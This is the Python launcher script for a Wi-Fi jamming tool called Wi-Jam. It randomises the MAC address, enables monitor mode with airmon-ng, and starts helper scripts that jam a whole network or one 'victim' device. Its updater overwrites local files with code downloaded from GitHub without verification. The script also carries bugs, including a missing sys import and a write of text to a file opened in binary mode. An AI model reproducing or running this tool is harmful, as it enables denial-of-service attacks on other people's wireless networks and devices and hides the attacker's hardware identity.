import os
import netifaces
import random
import time
import subprocess
import requests

Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'

line = "----------------------------------------------------------"
verl = open("core/.version", 'r').read()

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def main():
    clr()
    logo="""
 __   __  ___   __          ___      __       ___      ___ 
|"  |/  \|  "| |" \        |"  |    /""\     |"  \    /"  |
|'  /    \:  | ||  |       ||  |   /    \     \   \  //   |
|: /'        | |:  |       |:  |  /' /\  \    /\\  \/.    |
 \//  /\'    | |.  |    ___|  /  //  __'  \  |: \.        |
 /   /  \\   | /\  |\  /  :|_/ )/   /  \\  \ |.  \    /:  |
|___/    \___|(__\_|_)(_______/(___/    \___)|___|\__/|___|

   """,f"""
----------------------     -------------------------------
|      SecAnon       |     |   Version : {verl}     |
----------------------     -------------------------------

\t        Created by Honey Pots...

---------------------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1])

main()

def update():
    myfile = ('wi-jam.py','core/conn.py','core/jama.py','core/jams.py' ,'core/macs.py')
    for f in myfile:
        f = str(f)
        req = requests.get("https://raw.githubusercontent.com/HoneyPots0/Wi-Jam/master/" + f)
        dat = req.text
        file = open(f, 'wb')
        file.write(dat)
        file.close()
    print('\n\t    Updated Successfull !!!')
    input('\n\tPress Enter To Run Again Wi-Jam Tool: ')
    subprocess.call([sys.executable, 'wi-jam.py'])
def net_update_active():
    main()
    try:
        r = requests.get('https://www.honeypots.tech')
    except:
            print('\n\t     Your Internet Connection Slow ... ')
            print('\n\t\t     Error : 504\n')
            print(line)
            input('\n\tPress Enter To Continue : ')
    print('\n\t\t    Checking For Updates...')
    ver_r = requests.get(
        "https://raw.githubusercontent.com/HoneyPots0/Wi-Jam/main/core/.version")
    ver = ver_r.text
    try:
        verl = open("core/.version", 'r').read()
    except:
        pass
    if ver != verl:
        print('\n\t\tNew Version Available : ', ver)
        print('\n\t\t  Wi-Jam Tool Start Updating...')
        update()
    print("\n\t\tYour Version is Up-To-Date")
    print('\n\t\t    Starting HPomb...\n')
    time.sleep(1)
net_update_active()

main()

interfaces = netifaces.interfaces()


print(Red+"\t\t        InterFaces Detials\n"+Blue)
num = 1
wifi_list = []
for i in interfaces:
    if i[0:4] != 'wlan':
        continue
    print(f'[{num}] : {i}')
    wifi_list.append(i)
    num +=1

print("\n")     
inp = input("Please Choose Once Options : ")
wifi_sel = wifi_list[int(inp)-1]
addrs = netifaces.ifaddresses(wifi_sel)
details = addrs[netifaces.AF_LINK]
main()

if wifi_sel[-3:] == 'mon' :
    wifi_sel = wifi_sel.replace('mon','')
else:
    pass

print(Red+f"\t\t       {wifi_sel} Detials\n"+Blue)
try:
    print(f"MAC Address : {details[0]['addr'].strip()}")
except:
    pass
yes_no = input("\nDo You Want Change Your MAC Address [Y/N] : ")
yes_no = yes_no.lower().strip()

if yes_no == 'y' or yes_no == 'yes' :
    try:
        print("\n")
        os.system(f"ifconfig {wifi_sel} down")
        os.system(f"macchanger -r {wifi_sel} ")
        os.system(f"ifconfig {wifi_sel} up")
    except:
        pass
else :
    pass

print(line)


print(Red+f"\t\t       {wifi_sel} Monitor Start\n"+Blue,end="")
os.system(f'airmon-ng start {wifi_sel}')
proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/conn.py {wifi_sel}'  ])
main()
print(Red+f"\t\t Your Near All WIFI Details\n"+Blue)
mac = input("Please Enter WiFi Mac Address : ")
mac.strip()
channel = input(f"Please Enter WiFi Channel : ")
channel.strip()

main()
print(Red+f"\t\t       Final Jam WiFi \n"+Blue)
print("""
[1] Jam All WiFi Device
[2] Jam Single  Device 
""")

jam = input("Please Choose Once Option : ")

if int(jam) == 2 :
    main()
    print(Red+f"\t\t       WiFi  Scanning \n"+Blue)
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/macs.py {wifi_sel} {mac} {channel}'  ])
    main()
    print(Red+f"\t\t       Final Jam WiFi \n"+Blue)
    single = input("Please Victim Device Mac Address : ")
    single.strip()
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/jams.py {wifi_sel} {mac} {single}'  ])
else :
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/macs.py {wifi_sel} {mac} {channel}'  ])
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/jama.py {wifi_sel} {mac}'  ])
    main()
    print(Red+f"\t\t        WiFi Jamm SuccessFul \n"+Blue)
    input("Please Enter To Stop WiFi Jamming : ")
    proc.terminate()

